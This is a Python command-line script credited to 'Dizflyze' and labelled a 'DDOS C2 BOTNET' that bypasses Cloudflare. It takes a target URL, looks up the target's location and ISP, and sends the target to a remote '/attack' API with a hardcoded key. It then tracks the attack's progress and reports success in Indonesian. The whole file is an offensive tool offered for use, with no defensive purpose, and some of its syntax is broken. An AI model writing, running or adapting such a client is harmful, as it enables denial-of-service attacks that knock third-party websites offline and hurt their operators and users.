import os
import time
import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress
from urllib.parse import urlparse, urlunparse
import re

console = Console()

def L():
    console.clear()
    console.print(Panel.fit("""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Author : Dizflyze
⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] DDOS C2
⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] Version : v1.3.2
⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 26 MEI 2025
⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """, style="bold magenta"))
    console.print(
        Panel.fit(
            "DDOS C2 BOTNET DIZ FLYZE ONLY BYPASS CLOUDFLARE",
            style="bold yellow",
            padding=(1, 2),
        justify="center"
    )

def get_ip_info(target):
    try:
        hostname = urlparse(target).hostname
        response = requests.get(f"http://ip-api.com/json/{hostname}")
        return response.json() if response.status_code == 200 else None
    except:
        return None

def track_attack(api_url, attack_id, duration):
    with Progress() as progress:
        task = progress.add_task("[bold red] [ PROGRESS ]", total=100)
        start_time = time.time()
        
        while True:
            try:
                response = requests.get(f"{api_url}/status/{attack_id}")
                if response.status_code == 200:
                    data = response.json()
                    progress.update(task, completed=data['progress'])
                    if data['completed']:
                        return True
                else:
                    elapsed = time.time() - start_time
                    progress.update(task, completed=min((elapsed/duration)*100, 100))
                    
                if (time.time() - start_time) > duration:
                    return True
                    
                time.sleep(1)
            except:
                if (time.time() - start_time) > duration:
                    return True
                time.sleep(1)

def start_attack(api_url, target):
    try:
        response = requests.post(
            f"{api_url}/attack",
            json={"target": target, "apiKey": "TERMUX_KEY"}
        )
        return response.json() if response.status_code == 200 else None
    except:
        return None

def SR(info):
    table = Table.grid(expand=True)
    table.add_column(style="cyan", width=20)
    table.add_column(style="magenta")
    
    info_fields = {
        'query': 'Target',
        'country': 'Country',
        'city': 'City',
        'isp': 'ISP',
        'org': 'Organization',
        'as': 'ASN',
        'timezone': 'Timezone'
    }
    
    for field, label in info_fields.items():
        table.add_row(label, info.get(field, '-'))
    
    console.print(Panel.fit(
        table,
        title="[bold yellow][ ATTACK DETAILS ]",
        style="bold white",
        padding=(1, 2)
    )

def main():
    L()
    api_url = console.input("[bold white]╔═(api)Dizflyze Apikey)\n╚═══➤ ")
    
    L()
    target = console.input("[bold white]╔═(link)Dizflyze Streser)\n╚═══➤ ")
    target = requests.utils.quote(target, safe=':/')
    
    L()
    ip_info = get_ip_info(target)
    if not ip_info:
        console.print("[bold red] [ GAGAL MENDAPATKAN INFO TARGET ]")
        return
    
    attack_data = start_attack(api_url, target)
    if not attack_data:
        console.print("[bold red] [ GAGAL MEMULAI SERANGAN ]")
        return
    
    if track_attack(api_url, attack_data['attackId'], attack_data['duration']):
        L()
        SR(ip_info)
        console.print(f"\n[bold green]✓ SERANGAN BERHASIL DIKIRIM KE {target}")

if __name__ == "__main__":
    main()
